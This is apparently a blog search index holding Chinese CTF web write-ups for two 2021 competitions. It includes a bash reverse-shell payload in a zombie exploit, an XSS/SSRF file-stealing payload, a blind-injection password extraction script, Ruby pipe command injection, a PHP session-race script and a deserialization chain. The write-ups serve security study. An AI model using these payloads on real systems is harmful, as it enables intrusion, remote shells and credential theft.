<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2021祥云杯WEB-WP</title>
    <url>/posts/20107/</url>
    <content><![CDATA[<h2 id="前言"><a class="header-anchor" href="#前言">¶</a>前言</h2>
<p>谢谢各位哥哥带我进前三十❤️，想写wp的时候i春秋那边已经关了环境，所以去buu进行了复现。不过题目暂时还没上全，所以先解已经上线的题目（后续题目上线再补全）。<br>
团队完整wp地址：<a href="https://wp.n03tack.top/posts/62454/">https://wp.n03tack.top/posts/62454/</a></p>
<h2 id="cralwer-z"><a class="header-anchor" href="#cralwer-z">¶</a>cralwer_z</h2>
<p>zombie曾有个历史漏洞：<a href="https://ha.cker.in/index.php/Article/13563">https://ha.cker.in/index.php/Article/13563</a> ，我们需要想办法成功利用这个漏洞<br>
本题关键代码在user.js文件，在路由profile的post请求方法中，会将输入的<code>bucket</code>值赋值给<code>personalBucket</code><br>
<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/cralwer_z/5%5D%7D%28A%7BCL%297ML_%29TSJK0U0%40Q.png" alt=""><br>
而在verify路由中，如果token检验正确就会进入if方法，将<code>personalBucket</code>更新到<code>bucket</code>中<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/cralwer_z/%40HOT_4S%601YB%7BO%255XH78W%5DN2.png" alt=""><br>
但是可以看到这里正则进行了严格的限制<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/cralwer_z/Z0VT%5DDL_QX%7D%7B%40Q%244%5B%24DR9W6.png" alt=""><br>
即我们只能输入<code>https://32位数字或者字母.oss-cn-beijing.ichunqiu.com/</code>的形式，输入其他的无法将<code>personalBucket</code>更新到<code>bucket</code>中，不过这里有个变量覆盖的问题</p>
<ol>
<li>我们先正常进行请求，会跳转到<code>/user/verify</code>，更新<code>bucket</code>的同时获得了token</li>
<li>我们构造自己的ip地址，修改<code>personalBucket</code></li>
<li>用第一步获得的token去请求<code>/user/verify</code>，会把<code>personalBucket</code>更新到<code>bucket</code>中，完成变量覆盖</li>
</ol>
<p>思路已经很明确了，我们先在自己的vps上面放一个 <strong>exp.html</strong> ，内容为zombie漏洞的exp，下面ip和端口改成自己的</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;c=<span class="string">&#x27;constructor&#x27;</span>;<span class="built_in">this</span>[c][c](<span class="string">&quot;c=&#x27;constructor&#x27;;require=this[c][c](&#x27;return process&#x27;)().mainModule.require;var sync=require(&#x27;child_process&#x27;).spawnSync; var ls = sync(&#x27;bash&#x27;, [&#x27;-c&#x27;,&#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;],);console.log(ls.output.toString());&quot;</span>)()&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>然后就是进行正常请求，url会跳转到<code>verify</code>获取token<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/cralwer_z/0VMW2NB8RHHVCT%5B598X5%28BU.png" alt="">然后因为<code>checkBucket</code>的限制，我们需要带上<code>oss-cn-beijing.ichunqiu.com</code><br>
<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/cralwer_z/8MPYWXNW~G1L~6SFYC9O_F1.png" alt=""><br>
所以我们<code>bucket</code>输入如下<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/cralwer_z/741VRG5LHCP%5DP%28LDUC1G6HR.png" alt=""><br>
然后就是再访问一次</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;7d064cc8-729a-478d-bc90-bdd45876b751.node4.buuoj.cn:81&#x2F;user&#x2F;verify?token&#x3D;aa647751ec8004b5745271304ab5ed38a149a9c76214e79e81c49dc934ac5e0f</span><br></pre></td></tr></table></figure>
<p>我们输入的<code>personalBucket</code>成功更新到<code>bucket</code>中<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/cralwer_z/%60AN~A%40G%5B4H%5B28GE%25N3%5BU75M.png" alt=""><br>
然后vps那边开启nc监听，浏览器访问<code>7d064cc8-729a-478d-bc90-bdd45876b751.node4.buuoj.cn:81/user/bucket</code>，成功反弹shell<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/cralwer_z/%405%7BFK%40%609XZI6XSP~8I%7DBMRR.png" alt=""></p>
<h2 id="secrets-of-admin"><a class="header-anchor" href="#secrets-of-admin">¶</a>secrets_of_admin</h2>
<p>在 <strong>database.ts</strong> 文件中可以得到admin的密码，密码为e365655e013ce7fdbdbf8f27b418c8fe6dc9354dc4c0328fa02b0ea547659645<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/secrets_of_admin/DYVG7%28U%5B4%40O2%60T%28%2924%600G%5DH.png" alt=""><br>
同时可以观察到flag文件在<code>superuser</code>这个账号中，继续查看 <strong>routes/index.ts</strong> 文件，可以发现此账号被限制登录了，用admin账号登录后，传上去的文件名变成了md5的形式，并且存到<code>superuser</code>账号里<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/secrets_of_admin/%5BF_RGI44LOQB1LEE9S4%7D33J.png" alt=""><br>
不过提供了另一个增加文件的方法<code>/api/files</code><br>
<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/secrets_of_admin/FEJ%25%5DXU_W8%246KC%5B%40P2HN%7BRJ.png" alt=""><br>
但限制了本地访问，不过我们可以通过前面的<code>/admin</code>post方法进行 <strong>ssrf</strong> 打本地，继续观察可发现对输入的<code>content</code>进行了过滤<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/secrets_of_admin/%40DSP4UPVC%28R%25%7B%5B%60%7B%28_3F5VX.png" alt=""><br>
可以用数组进行绕过，接着就是构造payload，把 <strong>superuser</strong> 的flag文件添加到 <strong>admin</strong> 账号下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">content[]&#x3D;&lt;script&gt;location.href&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;api&#x2F;files?username&#x3D;admin&amp;filename&#x3D;..&#x2F;files&#x2F;flag&amp;checksum&#x3D;be5a14a8e504a66979f6938338b0662c&quot;;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/secrets_of_admin/S%5BX%28W1B%5BL3BVYOI4GCDZZ%5D9.png" alt=""><br>
再访问flag文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;api&#x2F;files&#x2F;be5a14a8e504a66979f6938338b0662c</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/secrets_of_admin/4UL%406Q%28~8SS%5B4N%40240%25M%29SD.png" alt=""></p>
<h2 id="Package-Manager"><a class="header-anchor" href="#Package-Manager">¶</a>Package Manager</h2>
<p>审计源码，在auth路由方法中存在sql注入漏洞<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/PackageManager/_7VOA6X1FYULMCSJ0P%25OXMD.png" alt=""><br>
构造payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00f355689f5b7cb21e2a34346d9c55cd&quot;||(this.username&#x3D;&#x3D;&quot;admin&quot;&amp;&amp;this.password[i]&#x3D;&#x3D;&quot;j&quot;)||&quot;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/PackageManager/HO18%25TL9MLYA0%6086%5B_6NQPL.png" alt=""><br>
<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/PackageManager/HUOTM%60WE3O9R__X~%5D88KJO0.png" alt=""><br>
存在盲注，所以写一个python脚本注出密码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/8/24 22:55</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://b2ac6fa8-4eb4-4c98-9f24-c41b32060edc.node4.buuoj.cn:81/auth&quot;</span></span><br><span class="line">cookies = &#123;<span class="string">&quot;session&quot;</span>: <span class="string">&quot;s%3Ad034-UqbmEKoZTjp_29TmqCvxuec67jE.E3VNBOuM%2BOpzxu%2Fi5ske43e80M2MLDu0FnLwEv9qmDI&quot;</span>&#125;</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        payload = <span class="string">&quot;00f355689f5b7cb21e2a34346d9c55cd\&quot;||(this.username==\&quot;admin\&quot;&amp;&amp;this.password[&#123;0&#125;]==\&quot;&#123;1&#125;\&quot;)||\&quot;&quot;</span>.format(i,chr(j))</span><br><span class="line">        data = &#123;<span class="string">&quot;_csrf&quot;</span>: <span class="string">&quot;sShk9REd-9QoAV2EvYHMOAPc6RQ0gjNdeyn4&quot;</span>, <span class="string">&quot;token&quot;</span>: payload&#125;</span><br><span class="line">        res = requests.post(url, cookies=cookies, data=data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> res.status_code==<span class="number">302</span>:</span><br><span class="line">            flag +=chr(j)</span><br><span class="line">            print(<span class="string">&quot;password:&quot;</span> + flag)</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/PackageManager/CZWE0KMO%29WR1TD62%40BCZ%29%5BD.png" alt=""><br>
注出admin的密码为<code>!@#&amp;@&amp;@efefef*@((@))grgregret3r</code>，登录后就有flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/PackageManager/R%290QAR%40SD~R%24S1%40%7BW3GI926.png" alt=""></p>
<h2 id="剩下的等buu更新"><a class="header-anchor" href="#剩下的等buu更新">¶</a>剩下的等buu更新</h2>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2021第五空间大赛WEB-WP</title>
    <url>/posts/64939/</url>
    <content><![CDATA[<h2 id="PNG图片转换器"><a class="header-anchor" href="#PNG图片转换器">¶</a>PNG图片转换器</h2>
<p>附件下载源码</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;digest&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;base64&#x27;</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  open(<span class="string">&quot;./view/index.html&quot;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/upload&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  open(<span class="string">&quot;./view/upload.html&quot;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">&#x27;/upload&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">unless</span> params[<span class="symbol">:file</span>] &amp;&amp; params[<span class="symbol">:file</span>][<span class="symbol">:tempfile</span>] &amp;&amp; params[<span class="symbol">:file</span>][<span class="symbol">:filename</span>] &amp;&amp; params[<span class="symbol">:file</span>][<span class="symbol">:filename</span>].split(<span class="string">&#x27;.&#x27;</span>)[-<span class="number">1</span>] == <span class="string">&#x27;png&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;error&#x27;);location.href=&#x27;/upload&#x27;;&lt;/script&gt;&quot;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">begin</span></span><br><span class="line">    filename = Digest::MD5.hexdigest(Time.now.to_i.to_s + params[<span class="symbol">:file</span>][<span class="symbol">:filename</span>]) + <span class="string">&#x27;.png&#x27;</span></span><br><span class="line">    open(filename, <span class="string">&#x27;wb&#x27;</span>) &#123; <span class="params">|f|</span></span><br><span class="line">      f.write open(params[<span class="symbol">:file</span>][<span class="symbol">:tempfile</span>],<span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="string">&quot;Upload success, file stored at <span class="subst">#&#123;filename&#125;</span>&quot;</span></span><br><span class="line">  <span class="keyword">rescue</span></span><br><span class="line">    <span class="string">&#x27;something wrong&#x27;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/convert&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  open(<span class="string">&quot;./view/convert.html&quot;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">&#x27;/convert&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">begin</span></span><br><span class="line">    <span class="keyword">unless</span> params[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;error&#x27;);location.href=&#x27;/convert&#x27;;&lt;/script&gt;&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    file = params[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">unless</span> file.index(<span class="string">&#x27;..&#x27;</span>) == <span class="literal">nil</span> &amp;&amp; file.index(<span class="string">&#x27;/&#x27;</span>) == <span class="literal">nil</span> &amp;&amp; file =~ <span class="regexp">/^(.+)\.png$/</span></span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;dont hack me&#x27;);&lt;/script&gt;&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    res = open(file, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">    headers <span class="string">&#x27;Content-Type&#x27;</span> =&gt; <span class="string">&quot;text/html; charset=utf-8&quot;</span></span><br><span class="line">    <span class="string">&quot;var img = document.createElement(\&quot;img\&quot;);\nimg.src= \&quot;data:image/png;base64,&quot;</span> + Base64.encode64(res).gsub(<span class="regexp">/\s*/</span>, <span class="string">&#x27;&#x27;</span>) + <span class="string">&quot;\&quot;;\n&quot;</span></span><br><span class="line">  <span class="keyword">rescue</span></span><br><span class="line">    <span class="string">&#x27;something wrong&#x27;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<p>这里利用的点是<code>CVE-2017-17405</code></p>
<blockquote>
<p>如果传递给 open 函数的文件名参数是以“|”开头，Ruby 会打开一个管道句柄并执行后面的命令。</p>
</blockquote>
<p>我们创建一个rb文件测试，内容如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f &#x3D; open(&quot;|whoami&quot;)</span><br><span class="line">puts f.read</span><br></pre></td></tr></table></figure>
<p>然后运行<br>
<em><img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4wp/png%E8%BD%AC%E6%8D%A2%E5%99%A8/I23%28%5B8UC8S_%5BIZ%28_I%5BAYSPD.png" alt=""></em><br>
成功执行了命令，看这道题的关键代码，在<code>/convert</code>路由处可以利用，不过限制了<code>..</code>和<code>/</code>，并且需要png结尾，不过我们可以通过系统变量构造出来</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">执行ls &#x2F;</span><br><span class="line">file&#x3D;|ls &#96;echo $&#123;PWD&#125;|cut -c 1&#96;&gt;dotast.png</span><br></pre></td></tr></table></figure>
<p><em><img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4wp/png%E8%BD%AC%E6%8D%A2%E5%99%A8/4W3LMCO9H5U%29%40BC%29K44%240%5B6.png" alt=""></em><br>
然后再读取dotast.png<br>
<em><img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4wp/png%E8%BD%AC%E6%8D%A2%E5%99%A8/7PRRBFQQ%5B%60P%7D1E8V%28%7B20%7D0G.png" alt=""></em><br>
base64解码后得到文件名：<code>FLA9_VixNxtSRFfd8IoFlnNvv</code>，然后就是读取这个文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file&#x3D;|cat &#96;echo $&#123;PWD&#125;|cut -c 1&#96;FLA9_VixNxtSRFfd8IoFlnNvv&gt;dotast.png</span><br></pre></td></tr></table></figure>
<p>再访问一次<code>file=dotast.png</code>，base64解码后得到flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4wp/png%E8%BD%AC%E6%8D%A2%E5%99%A8/%40%5B3%5B%7DEKT_%295F2GIW2Q%7D0Q%7B5.png" alt=""></p>
<h2 id="EasyCleanup"><a class="header-anchor" href="#EasyCleanup">¶</a>EasyCleanup</h2>
<p>session文件包含，之前ctfshow做过的题，直接跑脚本就好*</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/2/20 23:51</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">url = <span class="string">&#x27;http://114.115.134.72:32770/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php system(&quot;cat /flag_is_here_not_are_but_you_find&quot;);?&gt;dotasts&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">10</span>)</span><br><span class="line">        response = session.post(url,cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;flag&#x27;</span>&#125;, data=data, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;dota.txt&#x27;</span>, f)&#125;)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = session.get(url+<span class="string">&#x27;?file=/tmp/sess_flag&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;dotasts&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            print(response.text)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&#x27;retry&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    session = requests.session()</span><br><span class="line">    write = threading.Thread(target=write, args=(session,))</span><br><span class="line">    write.daemon = <span class="literal">True</span></span><br><span class="line">    write.start()</span><br><span class="line">    read(session)</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4wp/EasyCleanup/_6KXRPIY7XSEHI5M3%7D%24THRT.png" alt=""></p>
<h2 id="WebFTP"><a class="header-anchor" href="#WebFTP">¶</a>WebFTP</h2>
<p>github上有源码：<a href="https://github.com/wifeat/WebFTP">https://github.com/wifeat/WebFTP</a><br>
<code>/Readme/mytz.php</code>中可以执行phpinfo函数<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4wp/webftp/CEPUL0AEZC9UOOEBP%40%28HBMA.png" alt="">执行后phpinfo有flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4wp/webftp/L%251IB143HOYWG0Q61OQ%40R7U.png" alt=""></p>
<h2 id="pklovecloud"><a class="header-anchor" href="#pklovecloud">¶</a>pklovecloud</h2>
<p>代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pkshow</span> </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">echo_name</span>(<span class="params"></span>)     </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Pk very safe^.^&quot;</span>;      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">acp</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> $cinder;  </span><br><span class="line">    <span class="keyword">public</span> $neutron;</span><br><span class="line">    <span class="keyword">public</span> $nova;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123;      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;cinder = <span class="keyword">new</span> pkshow;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;cinder))  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;cinder-&gt;echo_name();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ace</span></span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> $filename;     </span><br><span class="line">    <span class="keyword">public</span> $openstack;</span><br><span class="line">    <span class="keyword">public</span> $docker; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">echo_name</span>(<span class="params"></span>)      </span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="keyword">$this</span>-&gt;openstack = unserialize(<span class="keyword">$this</span>-&gt;docker);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;openstack-&gt;neutron = $heat;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;openstack-&gt;neutron === <span class="keyword">$this</span>-&gt;openstack-&gt;nova)</span><br><span class="line">        &#123;</span><br><span class="line">        $file = <span class="string">&quot;./<span class="subst">&#123;$this-&gt;filename&#125;</span>&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (file_get_contents($file))         </span><br><span class="line">            &#123;              </span><br><span class="line">                <span class="keyword">return</span> file_get_contents($file); </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">            &#123; </span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;keystone lost~&quot;</span>; </span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;pks&#x27;</span>]))  </span><br><span class="line">&#123;</span><br><span class="line">    $logData = unserialize($_GET[<span class="string">&#x27;pks&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> $logData; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__file__</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>一个个看，首先<code>pkshow</code>类排除，没有用，但是<code>acp</code>类会调用<code>pkshow</code>的<code>echo_name()</code>方法，观察到<code>ace</code>类也有一个<code>echo_name()</code>方法，所以我们需要改成调用<code>ace</code>类的<code>echo_name()</code>方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ace</span></span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> $filename;     </span><br><span class="line">    <span class="keyword">public</span> $openstack;</span><br><span class="line">    <span class="keyword">public</span> $docker; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">echo_name</span>(<span class="params"></span>)      </span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="keyword">$this</span>-&gt;openstack = unserialize(<span class="keyword">$this</span>-&gt;docker);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;openstack-&gt;neutron = $heat;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;openstack-&gt;neutron === <span class="keyword">$this</span>-&gt;openstack-&gt;nova)</span><br><span class="line">        &#123;</span><br><span class="line">        $file = <span class="string">&quot;./<span class="subst">&#123;$this-&gt;filename&#125;</span>&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (file_get_contents($file))         </span><br><span class="line">            &#123;              </span><br><span class="line">                <span class="keyword">return</span> file_get_contents($file); </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">            &#123; </span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;keystone lost~&quot;</span>; </span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>在<code>ace</code>类中，会反序列<code>docker</code>中的内容，然后传给<code>openstack</code>，并且给成员变量<code>$neutron</code>赋值一个未知数，然后需要类中的<code>neutron</code>和<code>nova</code>强相等才会进入if里面，这里我们可以用变量引用的方式去使其永远相等，思路都懂了，构造pop链</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">acp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $cinder;</span><br><span class="line">    <span class="keyword">public</span> $neutron;</span><br><span class="line">    <span class="keyword">public</span> $nova;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$cinder</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; cinder = $cinder;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; neutron = &amp;<span class="keyword">$this</span> -&gt; nova;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ace</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $openstack;</span><br><span class="line">    <span class="keyword">public</span> $docker;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$docker</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; docker = $docker;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> acp(<span class="keyword">new</span> ace(serialize(<span class="keyword">new</span> acp(<span class="string">&quot;&quot;</span>))))));</span><br></pre></td></tr></table></figure>
<p>然后传参</p>
